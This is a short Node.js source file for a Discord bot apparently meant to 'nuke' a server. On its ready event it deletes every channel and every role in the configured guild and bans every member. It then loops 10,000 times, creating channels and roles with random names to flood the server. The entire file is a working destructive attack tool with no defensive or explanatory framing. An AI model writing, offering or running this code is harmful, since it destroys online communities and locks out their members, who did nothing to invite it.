const {randomBytes}=require('crypto')
const {Client}=require('discord.js')
global.client=new Client()
global.config=require('./config.json')

client.on('ready',async ()=>{
	guild=client.guilds.find(g=>g.id==config.serverID)
	guild.channels.map(c=>{
		c.delete()
			.then(()=>console.log(`${c.id}: channel ${c.name} successfully deleted.`))
			.catch((err)=>console.log(`${c.id}: channel ${c.name} not deleted. ${err}`))
	})
	guild.members.map(m=>{
		m.ban()
			.then(()=>console.log(`${m.id}: user ${m.user.tag} successfully banned.`))
			.catch((err)=>console.log(`${m.id}: user ${m.user.tag} not banned. ${err}`))
	})
	guild.roles.map(r=>{
		r.delete()
			.then(()=>console.log(`${r.id}: role ${r.name} successfully deleted.`))
			.catch((err)=>console.log(`${r.id}: role ${r.name} not deleted. ${err}`))
	})
	for(var i=0;i<10000;i++){
		guild.createChannel(randomBytes(20).toString('hex'),{type:Math.round(Math.random())?'text':Math.round(Math.random())?'voice':'category'})
			.then((c)=>console.log(`${c.id}: channel ${c.name} successfully created.`))
			.catch((c,err)=>console.log(`${c.id}: channel ${c.name} not created. ${err}`))
		guild.createRole({
			name  : randomBytes(20).toString('hex'),
			color : randomBytes(3).toString('hex')
		})
			.then((r)=>console.log(`${r.id}: role ${r.name} successfully created.`))
			.catch((r,err)=>console.log(`${r.id}: role ${r.name} not created. ${err}`))
	}
})

client.login(config.clientToken)
